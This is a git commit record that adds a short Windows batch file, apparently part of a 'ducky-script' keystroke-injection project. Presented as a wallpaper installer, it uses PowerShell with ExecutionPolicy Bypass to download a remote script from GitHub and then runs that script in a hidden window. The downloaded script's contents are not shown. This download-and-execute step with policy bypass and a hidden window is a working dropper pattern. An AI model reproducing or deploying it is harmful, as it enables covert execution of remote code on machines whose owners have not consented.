7d6b39982d8708ce0614a3db70e0bc2838f78fda
J0r00-creator <jack.mck.04@gmail.com>
2025-10-14 14:14:20 -0400

    Add files via upload

---
+++ run_wallpaper_installer.bat
@@ -0,0 +1,4 @@
+@echo off
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/J0r00-creator/ducky-script/main/install_wallpaper_sched.ps1' -OutFile $env:USERPROFILE\Desktop\install_wallpaper_sched.ps1"
+powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%USERPROFILE%\Desktop\install_wallpaper_sched.ps1"
+echo Done > "%USERPROFILE%\Desktop\wallpaper_installer_done.txt"
